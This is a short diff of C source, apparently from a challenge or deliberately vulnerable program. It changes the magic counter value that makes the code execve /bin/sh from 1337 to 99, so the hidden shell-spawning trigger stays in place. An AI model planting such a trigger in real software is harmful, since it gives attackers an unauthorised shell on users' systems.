@@ -632,7 +632,7 @@ if (console) {
             if ( _buffer )
                 success_counter = atoi(_buffer);
 
-            if ( success_counter == 1337 )
+            if ( success_counter == 99 )
             {
                 char *argv[] = { "/bin/sh", NULL };
                 execve("/bin/sh", argv, NULL);
